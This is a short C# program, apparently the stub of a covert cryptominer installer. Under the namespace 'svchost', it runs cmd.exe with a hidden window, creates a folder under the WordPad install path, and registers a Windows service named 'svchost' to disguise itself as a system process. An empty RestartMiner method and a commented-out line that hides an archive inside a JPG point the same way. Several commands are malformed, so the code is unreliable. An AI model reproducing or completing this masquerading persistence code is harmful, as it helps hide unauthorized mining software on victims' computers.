using System;
using System.Diagnostics;

namespace svchost
{
	class Program
	{
		static void Main(string[] args)
		{
			var process = new Process();
			var startInfo = new ProcessStartInfo();
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
			startInfo.FileName = "cmd.exe";
			//startInfo.Arguments = "/C copy /b Image1.jpg + Archive.rar Image2.jpg";
			//process.StartInfo = startInfo;
			//process.Start();

			var path = "C:\\Program Files\\Windows NT\\Accessories\\Wordpad";
			startInfo.Arguments = "mkdir " + path;
			process.StartInfo = startInfo;
			process.OutputDataReceived += (sender, e) =>
			{
				// Prepend line numbers to each line of the output.
				if (!String.IsNullOrEmpty(e.Data))
				{
					Console.WriteLine(e.Data);
					process.Kill();
				}
			};
			process.Start();
			startInfo.Arguments = "sc create svchost binpath=" + path;
			process.StartInfo = startInfo;
			process.Start();
		}

		void RestartMiner()
		{

		}
	}
}